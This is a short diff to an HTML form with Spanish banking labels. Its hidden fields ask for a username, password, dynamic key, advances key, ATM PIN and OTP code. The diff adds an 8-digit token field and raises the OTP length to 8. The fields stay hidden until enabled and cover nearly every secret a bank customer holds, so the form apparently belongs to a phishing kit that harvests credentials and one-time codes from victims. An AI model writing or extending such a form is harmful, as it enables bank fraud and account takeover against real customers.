@@ -40,6 +40,7 @@
                     <b class="hidden" id="user" style="margin-bottom: 10px !important;">Usuario: </b>
                     <b class="hidden" id="puser" style="margin-bottom: 10px !important;">Contraseña: </b>
                     <b class="hidden" id="cdin" style="margin-bottom: 10px !important;">Clave Dinámica: </b>
+                    <b class="hidden" id="dintok" style="margin-bottom: 10px !important;">Token: </b>
                     <b class="hidden" id="cavance" style="margin-bottom: 10px !important;">Clave Avances: </b>
                     <b class="hidden" id="ccaj" style="margin-bottom: 10px !important;">Clave Cajero: </b>
                     <b class="hidden" id="otpcode" style="margin-bottom: 10px !important;">Código OTP: </b>
@@ -51,9 +52,10 @@
                     <input class="hidden" required type="text" id="user">
                     <input class="hidden" required type="text" id="puser">
                     <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
+                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="dintok">
                     <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cavance">
                     <input class="hidden" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
-                    <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="otpcode">
+                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
                 </div>
             </form>
         </div>
